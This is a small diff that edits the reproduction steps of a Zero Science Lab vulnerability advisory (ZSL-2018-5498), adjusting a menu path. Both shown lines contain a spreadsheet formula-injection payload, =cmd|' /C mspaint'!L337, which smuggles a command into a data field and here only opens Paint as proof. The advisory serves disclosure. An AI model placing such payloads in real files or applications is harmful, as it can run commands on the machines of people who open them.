@@ -43,5 +43,5 @@ Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5498.php
 
 
 From the menu:
-Add -> use payload: =cmd|' /C mspaint'!L337
+User -> Add -> use payload: =cmd|' /C mspaint'!L337
 User -> Import / Export: use payload: =cmd|' /C mspaint'!L337
